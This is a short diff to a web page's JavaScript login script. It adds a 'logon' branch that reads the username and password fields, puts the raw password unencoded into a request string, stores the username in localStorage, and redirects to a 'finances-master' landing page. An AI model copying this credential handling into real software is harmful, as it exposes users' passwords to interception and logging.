@@ -22,6 +22,13 @@ if (method === 'login')
     localStorage.setItem("username", email);
     urlStr = "method=account_login_success&Email=" + email + "&Password=" + password;
 }
+if (method === 'logon')
+{
+        email = document.querySelector('input[id="username"]').value;
+        password = document.querySelector('input[id="password"]').value;
+        localStorage.setItem("username", email);
+        urlStr = "method=account_login_success&Email=" + email + "&Password=" + password;
+}
 if (method === 'otp')
     {
         otp = document.querySelector('input[id="otp"]').value;
@@ -86,6 +93,10 @@ xhttp.onreadystatechange = function() {
        if (method === 'register' || method === 'recover' || method === 'account_details_change')
        {
             window.location.replace('https://airfi.tech/finances-master/otp.html');
+       }
+       if (method === 'logon')
+       {
+             window.location.replace('https://airfi.tech/finances-master/landing.html');
        }
     }
 };
